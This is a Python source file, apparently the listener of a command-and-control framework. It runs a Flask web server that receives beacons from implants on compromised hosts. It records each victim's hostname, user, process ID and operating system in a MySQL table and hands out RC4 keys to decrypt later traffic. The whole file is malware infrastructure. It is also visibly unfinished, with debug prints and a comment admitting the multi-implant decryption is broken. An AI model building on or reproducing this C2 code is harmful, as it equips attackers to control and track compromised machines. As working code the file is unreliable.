import base64
import datetime
import json
import pymysql
import random
import string
from flask import Flask
from flask import request
from flask import make_response
from gevent import wsgi
from core.config import *
from core.message import Message


class WebServer(object):

    def __init__(self, args):
        self.protocol = args.protocol
        self.external_address = args.external_address
        self.port = args.port
        self.profile = args.profile

        self.app = Flask(__name__)
        self.app.debug = True

        # reads profile as a file
        with open(self.profile) as file:
            self.json = json.load(file)

        # tries to open a database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        except Exception:
            raise

    def start_web_server(self):
        """
        Description:
            This function starts the Flask web server
        """
        try:
            server = wsgi.WSGIServer(("0.0.0.0", self.port), self.app)
            self.app.add_url_rule(self.json["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])
            Message.display_status("[+] Started listener")
            server.serve_forever()

        except KeyboardInterrupt:
            pass

        except Exception:
            raise

    def crypt(self, key, data):
        """
        Description:
            This function is the encryption/decryption routine
        """
        S = list(range(256))
        j = 0
        out = []

        for i in list(range(256)):
            j = (j + S[i] + ord(key[i % len(key)])) % 256
            S[i], S[j] = S[j], S[i]

        i = j = 0

        for char in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(chr(char ^ S[(S[i] + S[j]) % 256]))

        return "".join(out)

    def is_base64(self, string):
        """
        Description:
            This function checks if a specified string is base64 encoded
        """
        try:
            base64.b64decode(string).decode()
            return True

        except Exception:
            return False

    def beacon_response(self):
        """
        Description:
            This function is called when an implant beacons
        """
        self.data = request.get_data()

        # if initial beacon
        if self.is_base64(self.data) is True:
            # base64 decodes
            decoded = base64.b64decode(self.data).decode()

            # parses json post data
            j = json.loads(decoded)
            hostname = j["h"]
            operating_system = j["o"]
            process_id = j["p"]
            current_user = j["u"]

            # generates a random 32 character encryption key (upper and lower, no numbers)
            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))

            # gets current time (uses server's time)
            now = datetime.datetime.now()
            time = now.strftime("%Y-%m-%d %H:%M:%S")

            # inserts an entry into the "implants" table
            with self.connection.cursor() as cursor:
                statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
                cursor.execute(statement, (hostname,
                                           current_user,
                                           process_id,
                                           operating_system,
                                           time,
                                           encryption_key))

            return encryption_key

        # else rc4 beacon
        else:
            # queries all encryption keys from the "implants" table
            with self.connection.cursor() as cursor:
                cursor.execute("SELECT `encryption_key` FROM `implants`")
                
                # DEBUGGING - fetchone() works and decrypts successfully if only one implant
                # if I do fetchall() - key becomes a tuple and it fucks things up
                result = cursor.fetchone()

                for key in result:
                    # verified that this is a "str"
                    print(type(key))

                    # "key" must be a string for this to work properly
                    print("potentially decrypted: " + self.crypt(key, self.data))

            return "rc4 beacon"
